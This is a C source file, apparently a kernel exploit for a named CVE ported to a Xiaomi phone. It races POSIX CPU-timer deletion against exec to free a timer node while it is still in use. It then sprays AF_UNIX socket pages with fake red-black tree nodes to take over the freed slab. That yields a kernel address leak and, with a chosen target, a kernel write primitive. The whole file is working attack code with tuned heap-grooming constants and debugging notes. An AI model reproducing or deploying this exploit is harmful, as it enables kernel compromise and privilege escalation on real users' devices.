/*
 * l65.c - CVE-2026-64560 ported to lhasa (Xiaomi 18 Fold / XRing O3 / 6.18.21).
 *
 * Why l64 never worked (two structural bugs, both fixed here):
 *
 *   1. l64 created the CPU timers *inside* the victim with CLK_PROC_CPU and ran
 *      the deleters *inside the victim* too.  de_thread() -> zap_other_threads()
 *      kills every sibling before release_task(old_leader) runs, so an in-victim
 *      deleter can never overlap the window.  Fix: the *parent* creates the
 *      timers for the victim's pid via the kernel-internal clock encoding
 *      ((~(pid)) << 3) | CPUCLOCK_SCHED and the *parent's* threads do the
 *      timer_delete storm (they are not zapped by de_thread).
 *   2. l64's "parent sweep" used the victim's timer ids from the parent; POSIX
 *      timer ids are process-local, so every delete returned EINVAL (the
 *      "del_fail=6144 errno=22" line).  Nothing was ever freed, so no slab could
 *      ever be returned to the buddy allocator and no spray could reclaim a page.
 *      Fix: the ids live in the parent, the deletes are real.
 *
 * Trigger point (measured on the reference port): the dangling timerqueue node
 * is walked when the process group dies ->
 *   do_exit -> posix_cpu_timers_exit_group -> cleanup_timers -> timerqueue_del
 * so the victim is SIGKILLed after the exec has landed.
 *
 * Two oracles:
 *   panic : no spray at all.  If the race hit, the dangling node is re-used by
 *           another k_itimer and the walk trips CONFIG_LIST_HARDENED with
 *           "list_add double add" -> kernel panic.  This is the cheap,
 *           proven-on-the-reference way to prove the race fires on this device.
 *   leak  : drain the posix_timers_cache back to baseline, spray order-1 pages
 *           with a fully-zero fake rb_node through AF_UNIX frags, then kill the
 *           victims.  A zeroed fake node makes __rb_erase_augmented take the
 *           "only node" branch (root->rb_node = NULL, no attacker write), and
 *           timerqueue_del's RB_CLEAR_NODE then writes the node's own kernel
 *           address into our page -> readable back with MSG_PEEK.  That is a
 *           non-crashing proof that the freed slab page is ours.
 *
 * AF_UNIX frag geometry on lhasa (disassembled, not assumed):
 *   unix_stream_sendmsg passes max_page_order = 3 (mov w5, #3) and
 *   data_len = size - 0xe80.  alloc_skb_with_frags @0xffffffc0801b2084
 *   walks order 3 -> 1 and takes the first order with
 *   round_up(data_len, PAGE_SIZE) >= PAGE_SIZE << order, giving up at order 1.
 *   size = 0xe80 + 8192 = 11872  =>  data_len = 8192  =>  order-1 page with all
 *   8192 bytes taken verbatim from our buffer (send 8192 only covers 4480 of
 *   the page, which is why the reference's 8192 constant is wrong here).
 *
 * posix_timers_cache on lhasa: 384 B x 21 objects / order-1 slab, stride 0x180.
 *
 * usage:
 *   l65 panic <rounds> <victims> <timers> [kill_ms]
 *   l65 leak  <attempts> <victims> <timers> <nfrag> <drain_ms> [min_drain_ms]
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define CPUCLOCK_SCHED 2
#define MAXCPU         10
#define MAXV           16
#define MAXT           512

#define NODE_OFF       0x0e0UL          /* k_itimer.it.cpu.node (BTF) */
#define SLOT_STRIDE    0x180UL
#define SLOT_COUNT     21
#define PAGE_SZ        8192UL
#define HEAD_LEN       0x0e80UL
#define FRAG_SEND      (HEAD_LEN + PAGE_SZ)
#define RING_MAX       8192
#define FILL_BYTE      0x41

static volatile int *g_del;             /* per-victim successful delete count */
static volatile int *g_go;              /* per-victim "storm may start"      */
static int g_nworkers = 4;              /* delete threads per victim         */
static int g_gate;                      /* exec fires after this many deletes */
static int g_spread_us;                 /* sleep between deletes -> long storm */

static int g_ring[RING_MAX];
static int g_ring_n, g_ring_head, g_ring_cap;

static long long now_ms(void)
{
    struct timespec t;

    clock_gettime(CLOCK_MONOTONIC, &t);
    return (long long)t.tv_sec * 1000 + t.tv_nsec / 1000000;
}

static void pin_cpu(int c)
{
    cpu_set_t s;

    CPU_ZERO(&s);
    CPU_SET(c % MAXCPU, &s);
    sched_setaffinity(0, sizeof s, &s);
}

static int read_posix_slab(int *active, int *total)
{
    FILE *f = fopen("/proc/slabinfo", "re");
    char line[256];

    if (!f) return -1;
    while (fgets(line, sizeof line, f)) {
        if (sscanf(line, "posix_timers_cache %d %d", active, total) == 2) {
            fclose(f);
            return 0;
        }
    }
    fclose(f);
    return -1;
}

static int make_timer(clockid_t cid)
{
    struct sigevent ev;
    struct itimerspec its;
    int id = -1;

    memset(&ev, 0, sizeof ev);
    ev.sigev_notify = SIGEV_SIGNAL;
    ev.sigev_signo = SIGUSR1;
    if (syscall(SYS_timer_create, cid, &ev, &id) != 0) return -1;
    memset(&its, 0, sizeof its);
    its.it_value.tv_sec = 3600;         /* far future: the node stays queued */
    if (syscall(SYS_timer_settime, id, 0, &its, NULL) != 0) {
        syscall(SYS_timer_delete, id);
        return -1;
    }
    return id;
}

struct deljob {
    int widx, wcount, n, victim;
    int *ids;
};
static void *delete_worker(void *arg)
{
    struct deljob *j = arg;

    pin_cpu(2 + j->widx);
    while (!g_go[j->victim]) ;
    for (int i = j->widx; i < j->n; i += j->wcount) {
        if (syscall(SYS_timer_delete, j->ids[i]) == 0)
            __sync_fetch_and_add((int *)&g_del[j->victim], 1);
        if (g_spread_us) usleep((useconds_t)g_spread_us);
    }
    return NULL;
}

struct execjob {
    volatile int *del;
    int need;
};

static void *exec_thread(void *arg)
{
    struct execjob *j = arg;
    char *argv[] = { (char *)"/proc/self/exe", (char *)"--victim-child", NULL };

    pin_cpu(1);
    while (*j->del < j->need) ;
    execv(argv[0], argv);
    _exit(111);
}

/* One fake rb_node per slot; the page offset 0 also carries a clean parent. */
static void build_fragment(unsigned char *p, size_t len, unsigned long long parent,
                           unsigned long long left, unsigned long long right)
{
    memset(p, FILL_BYTE, len);
    *(unsigned long long *)(p + 0x00) = 1;      /* parent=NULL, colour=BLACK */
    *(unsigned long long *)(p + 0x08) = 0;
    *(unsigned long long *)(p + 0x10) = 0;

    for (unsigned long slot = 0; slot < SLOT_COUNT; slot++) {
        unsigned long base = slot * SLOT_STRIDE + NODE_OFF;

        if (base + 0x40 > len) break;
        *(unsigned long long *)(p + base + 0x00) = parent;
        *(unsigned long long *)(p + base + 0x08) = right;
        *(unsigned long long *)(p + base + 0x10) = left;
        *(unsigned long long *)(p + base + 0x18) = 0;   /* expires  */
        *(unsigned long long *)(p + base + 0x20) = 0;   /* timer    */
        *(unsigned long long *)(p + base + 0x28) = 0;   /* task     */
    }
}

/* Every frag is one order-1 page; keep the receiving ends so the payload stays
 * resident and can be read back with MSG_PEEK. */
static int frag_spray(int n, const unsigned char *buf)
{
    int ok = 0;

    for (int i = 0; i < n; i++) {
        int sv[2];

        if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, sv) != 0) break;
        if (send(sv[0], buf, FRAG_SEND, MSG_NOSIGNAL) != (ssize_t)FRAG_SEND) {
            close(sv[0]); close(sv[1]);
            break;
        }
        close(sv[0]);
        if (g_ring_n == g_ring_cap) {
            close(g_ring[g_ring_head]);
            g_ring[g_ring_head] = sv[1];
            g_ring_head = (g_ring_head + 1) % g_ring_cap;
        } else {
            g_ring[(g_ring_head + g_ring_n) % g_ring_cap] = sv[1];
            g_ring_n++;
        }
        ok++;
    }
    return ok;
}

static void frag_trim_all(void)
{
    for (int i = 0; i < g_ring_n; i++)
        if (g_ring[i] >= 0) close(g_ring[i]);
    g_ring_n = 0;
    g_ring_head = 0;
}

/* One round = nv victims, each with ntimer parent-owned CPU timers, a delete
 * storm in the parent and one non-leader exec in the victim.  Returns the
 * number of victims that reached exec. */
static int run_round(int nv, int ntimer, pid_t *vpid, int **ids_out, int *made_out)
{
    for (int j = 0; j < nv; j++) { g_go[j] = 0; g_del[j] = 0; vpid[j] = -1; ids_out[j] = NULL; }

    for (int j = 0; j < nv; j++) {
        pid_t v = fork();

        if (v == 0) {
            struct execjob ej;
            pthread_t th;

            signal(SIGUSR1, SIG_IGN);
            pin_cpu(1);
            ej.del  = &g_del[j];
            ej.need = g_gate ? g_gate : ntimer / 10;
            if (pthread_create(&th, NULL, exec_thread, &ej) != 0) _exit(120);
            for (;;) pause();
        }
        if (v < 0) break;
        vpid[j] = v;

        clockid_t cid = (clockid_t)(((~(unsigned int)v) << 3) | CPUCLOCK_SCHED);
        int *ids = calloc((size_t)ntimer, sizeof(int));
        if (!ids) break;
        int n = 0;
        for (; n < ntimer; n++) {
            int id = make_timer(cid);
            if (id < 0) break;
            ids[n] = id;
        }
        ids_out[j] = ids;
        made_out[j] = n;
        if (n == 0) {
            static int once;
            if (!once++) printf("  [!] timer_create failed errno=%d (%s)\n", errno, strerror(errno));
            continue;
        }

        pthread_t th[8];
        struct deljob jobs[8];
        int nw = g_nworkers > 8 ? 8 : (g_nworkers < 1 ? 1 : g_nworkers);
        for (int i = 0; i < nw; i++) {
            jobs[i].widx = i; jobs[i].wcount = nw; jobs[i].n = n;
            jobs[i].ids = ids; jobs[i].victim = j;
            pthread_create(&th[i], NULL, delete_worker, &jobs[i]);
        }
        g_go[j] = 1;
        for (int i = 0; i < nw; i++) pthread_join(th[i], NULL);
    }
    return nv;
}

int main(int argc, char **argv)
{
    if (argc > 1 && !strcmp(argv[1], "--victim-child")) {
        signal(SIGUSR1, SIG_IGN);
        for (;;) pause();
    }
    if (argc < 3) {
        fprintf(stderr,
                "usage:\n"
                "  %s panic <rounds> <victims> <timers> [kill_ms]\n"
                "  %s leak  <attempts> <victims> <timers> <nfrag> <drain_ms> [min_drain_ms]\n",
                argv[0], argv[0]);
        return 2;
    }

    int leakmode = !strcmp(argv[1], "leak");
    int rounds   = atoi(argv[2]);
    int nv       = argc > 3 ? atoi(argv[3]) : 8;
    int ntimer   = argc > 4 ? atoi(argv[4]) : 400;
    int kill_ms  = 200;
    int nfrag    = 0, drain_ms = 0, min_drain = 4500;
    unsigned long long target = 0;

    if (leakmode) {
        nfrag     = argc > 5 ? atoi(argv[5]) : 1500;
        drain_ms  = argc > 6 ? atoi(argv[6]) : 20000;
        min_drain = argc > 7 ? atoi(argv[7]) : 4500;
        if (argc > 8) target = strtoull(argv[8], NULL, 0);
        kill_ms   = 0;
    } else {
        if (argc > 5) kill_ms = atoi(argv[5]);
        if (argc > 6) g_nworkers = atoi(argv[6]);
        if (argc > 7) g_gate = atoi(argv[7]);
        if (argc > 8) g_spread_us = atoi(argv[8]);
    }

    if (nv > MAXV) nv = MAXV;
    if (ntimer > MAXT) ntimer = MAXT;
    if (nfrag > RING_MAX - 16) nfrag = RING_MAX - 16;
    g_ring_cap = nfrag + 512;

    signal(SIGUSR1, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);
    pin_cpu(0);

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0 && rl.rlim_cur < rl.rlim_max) {
        rl.rlim_cur = rl.rlim_max;
        setrlimit(RLIMIT_NOFILE, &rl);
    }

    char *shm = mmap(NULL, 8192, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (shm == MAP_FAILED) { printf("mmap failed\n"); return 1; }
    g_go  = (volatile int *)(shm + 0);
    g_del = (volatile int *)(shm + 256);

    unsigned char *fbuf = malloc(FRAG_SEND);
    if (!fbuf) return 1;
    /* target == 0 -> all-zero fake node, i.e. "only node" branch: no attacker
     * write at all, pure takeover probe.  target != 0 -> __rb_erase_augmented
     * takes the "only left child" branch and executes tmp->__rb_parent_color =
     * pc with pc = 0, i.e. *(target) = 0, while rb_next() still returns NULL
     * (parent and rb_right are both 0) so rb_leftmost is not polluted. */
    build_fragment(fbuf, PAGE_SZ, 0, target, 0);

    int base_a = -1, base_t = -1;
    read_posix_slab(&base_a, &base_t);

    printf("l65 mode=%s rounds=%d victims=%d timers=%d nodepos=%#lx stride=%#lx "
           "frag_send=%lu slab_base=%d/%d cpus=%d target=%#llx workers=%d gate=%d\n",
           leakmode ? "leak" : "panic", rounds, nv, ntimer,
           (unsigned long)NODE_OFF, (unsigned long)SLOT_STRIDE,
           (unsigned long)FRAG_SEND, base_a, base_t, MAXCPU, target,
           g_nworkers, g_gate ? g_gate : ntimer / 10);
    fflush(stdout);

    pid_t vpid[MAXV];
    int *ids[MAXV], made[MAXV];
    long long t_start = now_ms();
    long long execs = 0;

    for (int r = 1; r <= rounds; r++) {
        int n = run_round(nv, ntimer, vpid, ids, made);

        /* give the execs time to land while the storms are still draining */
        if (!leakmode) usleep(kill_ms * 1000);

        int drained = 0, act = -1, tot = -1;
        if (leakmode) {
            long long t0 = now_ms();
            while (now_ms() - t0 < drain_ms) {
                if (read_posix_slab(&act, &tot) == 0 &&
                    base_a > 0 && act <= base_a + 64 && tot <= base_t + 64 &&
                    now_ms() - t0 >= min_drain) {
                    drained = 1;
                    break;
                }
                usleep(100000);
            }
            if (!drained) { printf("  [!] drain timeout slab=%d/%d\n", act, tot); fflush(stdout); }
        }

        int ring_before = g_ring_n;
        int got = leakmode ? frag_spray(nfrag, fbuf) : 0;

        for (int j = 0; j < n; j++)
            if (vpid[j] > 0) { kill(vpid[j], SIGKILL); execs++; }
        usleep(300 * 1000);
        for (int j = 0; j < n; j++) { free(ids[j]); ids[j] = NULL; }

        int leaks = 0;
        if (leakmode) {
            for (int i = ring_before; i < g_ring_n; i++) {
                unsigned char back[PAGE_SZ];
                ssize_t m = recv(g_ring[i], back, sizeof back, MSG_PEEK | MSG_DONTWAIT);

                if (m != (ssize_t)sizeof back) continue;
                for (size_t off = 0; off + 8 <= sizeof back; off += 8) {
                    unsigned long long v;

                    if (memcmp(back + off, fbuf + off, 8) == 0) continue;
                    memcpy(&v, back + off, 8);
                    if (v < 0xffffff8000000000ULL) continue;
                    if ((v & 0x1fffULL) != (unsigned long long)off) continue;
                    if ((off % SLOT_STRIDE) != NODE_OFF) continue;
                    printf("  *** LEAK attempt=%d fd=%d off=%#zx val=%#llx page=%#llx\n",
                           r, i, off, v, v & ~0x1fffULL);
                    leaks++;
                    break;
                }
            }
            frag_trim_all();
        }

        int a = -1, t = -1;
        read_posix_slab(&a, &t);
        int delsum = 0;
        for (int j = 0; j < MAXV; j++) delsum += g_del[j];
        printf("round=%d/%d execs=%lld del=%d slab=%d/%d%s elapsed=%.1fs\n",
               r, rounds, execs, delsum, a, t,
               leakmode ? (drained ? " drained" : " NODRAIN") : "",
               (now_ms() - t_start) / 1000.0);
        if (leaks) { printf("LEAK_HIT leaks=%d -> page takeover works\n", leaks); }
        fflush(stdout);
        if (leaks) return 0;
    }

    printf("done: execs=%lld in %.1fs (%.1f execs/s), no panic, no leak\n",
           execs, (now_ms() - t_start) / 1000.0,
           execs / ((now_ms() - t_start) / 1000.0));
    return 0;
}
